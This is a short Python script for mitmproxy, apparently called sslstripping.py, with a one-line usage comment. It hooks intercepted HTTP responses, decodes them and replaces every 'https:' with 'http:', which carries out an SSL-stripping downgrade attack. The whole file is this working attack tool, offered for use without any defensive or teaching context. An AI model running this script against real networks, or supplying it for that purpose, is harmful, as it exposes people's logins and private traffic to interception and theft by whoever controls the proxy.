# Usage: mitmdump -s "sslstripping.py"
# (this script works best with --anticache)
from libmproxy.models import decoded

def response(context, flow):
    with decoded(flow.response):  # automatically decode gzipped responses.
        flow.response.content = flow.response.content.replace('https:','http:');